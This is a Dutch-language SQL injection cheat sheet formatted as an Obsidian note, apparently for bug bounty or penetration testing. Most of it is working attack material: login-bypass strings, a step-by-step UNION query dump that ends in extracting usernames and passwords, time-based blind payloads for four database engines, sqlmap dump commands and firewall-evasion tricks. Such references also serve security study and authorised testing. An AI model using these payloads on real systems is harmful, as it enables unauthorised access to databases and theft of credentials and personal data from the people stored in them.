
Dit is de "Big Boss" van de web vulnerabilities. Als je SQL Injection (SQLi) beheerst, kun je de volledige database van een bedrijf overnemen.

Ik heb deze notitie zo opgebouwd dat je begint met simpele detectie en eindigt met geavanceerde extractie en SQLmap.

Kopieer dit blok direct in je Obsidian vault:

Markdown

````
# 🗄️ SQL Injection (SQLi)

==Doel: Database queries manipuleren om data te stelen, te wijzigen of inlogportalen te omzeilen.==
*Impact: Critical (Data Breach).*



---

## 🔍 1. Detection (Breken & Logica)
*Hoe weet je of een parameter kwetsbaar is?*

### Error Based (Het "Hekje")
Voeg speciale tekens toe en kijk of de pagina crasht of een database error geeft (bijv. "MySQL Error").
* `'` (Single quote)
* `"` (Double quote)
* `\` (Backslash)
* `;` (Semicolon)

### Boolean Based (True/False Test)
Verander de logica. Als de pagina anders reageert bij `True` dan bij `False`, heb je beet.

**Test 1: ID parameter**
* `?id=1` (Normaal)
* `?id=1'` (Crash/Leeg -> Mogelijk kwetsbaar)
* `?id=1' OR '1'='1` (True -> Laat alles zien?)
* `?id=1' AND '1'='2` (False -> Pagina leeg/anders?)

**Test 2: Rekenkunde**
* `?id=10` (Laat product 10 zien)
* `?id=11-1` (Laat product 10 zien? -> **Kwetsbaar!** De DB voert de som uit).

---

## 🔓 2. Auth Bypass (Login Screens)
*Probeer in te loggen als Admin zonder wachtwoord.*
Plak dit in het gebruikersnaam veld (wachtwoord mag willekeurig zijn).

```sql
admin' --
admin' #
admin' OR '1'='1
' OR 1=1--
' OR 1=1#
admin" --
````

---

## 🏗️ 3. Union-Based Exploitation (Manual Dump)

_Als je de output van de query op het scherm ziet, gebruik je UNION om data uit andere tabellen toe te voegen._

Stap 1: Hoeveel kolommen? (ORDER BY)

Blijf het getal verhogen tot je een error krijgt of de pagina breekt.

SQL

```
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--  (Pagina OK)
?id=1 ORDER BY 3--  (Pagina breekt? -> Er zijn dus 2 kolommen)
```

Stap 2: Waar komt de data? (UNION SELECT)

Kijk welk nummer op het scherm verschijnt.

SQL

```
?id=-1 UNION SELECT 1, 2--
```

(Gebruik ID=-1 zodat het originele product niet getoond wordt, alleen jouw nummers).

Stel: je ziet het nummer 2 op het scherm. Dan is kolom 2 kwetsbaar.

Stap 3: Data dumpen (De Payload)

Vervang het zichtbare nummer (2) door database functies.

**Database Info:**

SQL

```
?id=-1 UNION SELECT 1, database(), 3--
?id=-1 UNION SELECT 1, version(), 3--
?id=-1 UNION SELECT 1, user(), 3--
```

**Tabelnamen ophalen (MySQL):**

SQL

```
?id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--
```

**Kolomnamen ophalen (MySQL):**

SQL

```
?id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users'--
```

**Data stelen:**

SQL

```
?id=-1 UNION SELECT 1, group_concat(username,':',password), 3 FROM users--
```

---

## 🙈 4. Blind SQLi (Time & Boolean)

_Als je **geen** error of tekst ziet, laat de database wachten (Sleep)._

Time-Based Payloads:

Als de pagina normaal direct laadt, maar nu 10 seconden duurt -> Bingo.

|**Database**|**Payload**|
|---|---|
|**MySQL**|`' AND sleep(10)--`|
|**PostgreSQL**|`'; SELECT pg_sleep(10)--`|
|**MSSQL**|`'; WAITFOR DELAY '0:0:10'--`|
|**Oracle**|`' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('RDS',10)--`|

---

## 🤖 5. SQLMap (Automation King)

_De tool om alles automatisch te dumpen. Gebruik dit pas als je handmatig bewijs hebt (sommige programma's verbieden SQLMap)._

**Basis Scan (GET request):**

Bash

```
sqlmap -u "[http://target.com/page.php?id=5](http://target.com/page.php?id=5)" --batch --dbs
```

Request File (Aanbevolen!):

Sla het request op vanuit Burp Suite (Rechtermuisklik -> Copy to file -> req.txt).

Bash

```
sqlmap -r req.txt --batch --dbs
```

**Gevorderde opties:**

- `--level=5 --risk=3`: Test álle headers en gevaarlijke payloads.
    
- `--random-agent`: Gebruik een echte browser User-Agent.
    
- `--tamper=space2comment`: Probeer WAFs te omzeilen.
    
- `--dump`: Haal de data op.
    

---

## 🛡️ 6. WAF Bypassing (Filters Omzeilen)

_De firewall blokkeert `UNION` of `SELECT`?_

Comments:

Breek de woorden op met comments (SQL leest dit als spaties).

SQL

```
UN/**/ION/**/SE/**/LECT
```

Case Sensitivity:

Sommige filters blokkeren UNION maar niet uNiOn.

SQL

```
uNiOn SeLeCt 1,2,3--
```

Encoding:

Gebruik URL encoding (Ctrl+U in Burp).

- `'` -> `%27`
    
- `#` -> `%23` (Belangrijk in browser URL balk!)
    

Inline Comments (MySQL):

Versienummer comments worden uitgevoerd in MySQL.

SQL

```
/*!UNION*/ /*!SELECT*/ 1,2,3
```

---

## 📝 Checklist SQLi

- [ ] **Errors:** Heb ik `' " ;` geprobeerd om errors te triggeren?
    
- [ ] **Logica:** Heb ik `AND 1=1` vs `AND 1=0` getest?
    
- [ ] **Numeriek:** Heb ik rekensommen geprobeerd (`id=10-2`)?
    
- [ ] **Headers:** Heb ik `User-Agent`, `Referer` en `X-Forwarded-For` getest met SQLMap?
    
- [ ] **Hidden Params:** Heb ik tools als `Arjun` gebruikt om verborgen SQL parameters te vinden?
    
- [ ] **Sleep:** Heb ik payloads voor alle databases (MySQL, Postgres, MSSQL) geprobeerd?